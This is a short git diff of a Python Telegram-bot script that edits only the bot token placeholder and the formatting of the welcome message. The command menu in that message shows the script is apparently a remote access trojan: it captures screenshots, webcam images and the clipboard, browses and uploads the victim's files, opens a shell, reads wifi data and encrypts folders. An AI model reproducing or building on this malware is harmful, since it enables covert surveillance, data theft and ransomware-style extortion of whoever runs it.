@@ -13,7 +13,7 @@ import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
-TOKEN = ''  
+TOKEN = 'YOUR-TOKEN'
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
@@ -23,7 +23,7 @@ bot.set_webhook()
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  ')
+    bot.send_message(message.chat.id, 'Welcome! Send \n /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  ')
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
